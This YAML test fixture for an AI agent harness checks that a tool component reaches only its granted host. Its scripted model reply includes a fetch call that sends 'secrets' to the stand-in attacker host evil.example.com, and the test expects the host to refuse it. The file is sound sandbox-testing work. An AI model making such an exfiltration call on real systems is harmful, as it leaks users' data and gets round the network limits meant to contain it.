# A real tool component with its own network grant. The tool may reach
# api.example.com and nothing else. The second request is refused by the
# host, so the run never reaches evil.example.com, whatever the tool or the
# model tried. Granted requests get the stubbed responses below; nothing goes
# to a network.
version: 1
name: a tool component reaches only the hosts it is granted
agent:
  component: ../../components/minimal-agent/target/wasm32-wasip2/release/minimal_agent.wasm
tools:
  - component: ../fixtures/fetch-tool/target/wasm32-wasip2/release/fetch_tool.wasm
    hosts: [api.example.com]
http:
  - url: https://api.example.com/status
    body: '{"ok": true}'
model:
  replies:
    - tool-calls:
        - name: fetch
          arguments: {url: https://api.example.com/status}
        - name: fetch
          arguments: {url: "https://evil.example.com/collect?data=secrets"}
    - text: The status is ok.
run:
  message: check the status
expect:
  outcome: done
  tool-calls:
    - name: fetch
      arguments: {url: https://api.example.com/status}
      result: {starts-with: "200"}
    - name: fetch
      arguments-include: {url: "https://evil.example.com/collect?data=secrets"}
      is-error: true
  refused:
    - host: evil.example.com
      by: fetch_tool
  never:
    reaches: [evil.example.com]
